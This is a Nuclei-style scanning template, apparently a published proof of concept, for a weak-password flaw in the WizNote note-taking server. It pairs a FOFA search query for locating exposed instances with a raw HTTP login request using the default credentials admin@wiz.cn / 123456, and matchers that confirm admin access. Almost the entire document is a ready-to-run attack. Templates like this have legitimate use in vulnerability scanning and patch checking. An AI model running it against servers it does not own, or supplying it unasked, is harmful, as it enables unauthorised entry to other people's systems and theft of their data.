id: wiznote-login-weak-password

info:
  name: "为知笔记 login 接口存在弱口令认证绕过漏洞"
  author: NdayPoc
  severity: high
  description: |-
    fofa: title="WizNote"
    为知笔记 login 路径处的登录接口存在弱口令漏洞，未授权的攻击者可通过该漏洞直接进入后台管理页面，获取敏感信息，进一步利用可控制整个服务器。
  reference:
  - https://mp.weixin.qq.com/s/MVXF3ZVU7WFiAXhakiL-hw
  tags: WizNote

http:
- raw:
  - |
    POST /as/user/login?clientType=web&clientVersion=4.0&lang=zh-cn HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {"userId":"admin@wiz.cn","password":"123456","autoLogin":true,"domain":"","deviceId":null}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{"returnCode":200'
    - '"returnMessage":"OK"'
    condition: and
  - type: status
    status:
    - 200
